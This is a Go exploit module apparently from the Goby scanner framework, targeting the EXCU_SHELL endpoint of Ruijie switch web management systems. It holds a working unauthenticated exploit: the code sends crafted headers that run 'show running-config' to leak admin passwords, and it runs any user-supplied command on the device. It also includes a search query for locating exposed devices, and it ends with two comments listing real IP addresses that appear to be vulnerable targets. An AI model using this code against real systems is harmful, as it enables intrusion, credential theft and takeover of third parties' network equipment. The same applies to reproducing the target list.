package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie WEB Management System EXCU_SHELL Information Disclosure Vulnerability",
    "Description": "<p>Ruijie WEB management system is a switch device widely used in government, education, finance, medical and health care, and enterprises.</p><p>Ruijie WEB management system EXCU_SHELL has an information leakage vulnerability, and attackers can obtain sensitive information such as system passwords to further control the system.</p>",
    "Product": "Ruijie-WEB-management-system",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2023-02-12",
    "Author": "h1ei1",
    "FofaQuery": "body=\"img/free_login_ge.gif\" && body=\"./img/login_bg.gif\"",
    "GobyQuery": "body=\"img/free_login_ge.gif\" && body=\"./img/login_bg.gif\"",
    "Level": "2",
    "Impact": "<p>Ruijie WEB management system EXCU_SHELL has an information leakage vulnerability, and attackers can obtain sensitive information such as system passwords to further control the system.</p>",
    "Recommendation": "<p>The manufacturer has released security patches, please update them in time: <a href=\"https://www.ruijie.com.cn/.\">https://www.ruijie.com.cn/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "show running-config",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞",
            "Product": "锐捷交换机WEB管理系统",
            "Description": "<p>锐捷交换机WEB管理系统是一款被广泛应用于政府、教育、金融、医疗卫生、企业的交换机设备。<br></p><p>锐捷交换机WEB管理系统 EXCU_SHELL 存在信息泄露漏洞，攻击者可获取系统密码等敏感信息进一步控制系统。<br></p>",
            "Recommendation": "<p>厂商已发布安全补丁，请及时更新：<a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a>。<br></p>",
            "Impact": "<p>锐捷交换机WEB管理系统 EXCU_SHELL 存在信息泄露漏洞，攻击者可获取系统密码等敏感信息进一步控制系统。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Ruijie WEB Management System EXCU_SHELL Information Disclosure Vulnerability",
            "Product": "Ruijie-WEB-management-system",
            "Description": "<p>Ruijie WEB management system is a switch device widely used in government, education, finance, medical and health care, and enterprises.<br></p><p>Ruijie WEB management system EXCU_SHELL has an information leakage vulnerability, and attackers can obtain sensitive information such as system passwords to further control the system.<br></p>",
            "Recommendation": "<p>The manufacturer has released security patches, please update them in time: <a href=\"https://www.ruijie.com.cn/.\">https://www.ruijie.com.cn/.</a><br></p>",
            "Impact": "<p>Ruijie WEB management system EXCU_SHELL has an information leakage vulnerability, and attackers can obtain sensitive information such as system passwords to further control the system.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10803"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/EXCU_SHELL"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("cmdnum", "1")
			cfg.Header.Store("confirm1", "n")
			cfg.Header.Store("command1", "show%20running-config")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "no service password-encrypt") && strings.Contains(resp.RawBody, "user admin password")

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/EXCU_SHELL"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("cmdnum", "1")
			cfg.Header.Store("confirm1", "n")
			cfg.Header.Store("command1", cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = resp.RawBody
				expResult.Success = true
			}
			return expResult
		},
	))
}

//http://60.165.53.178:8814
//http://211.97.2.196:8005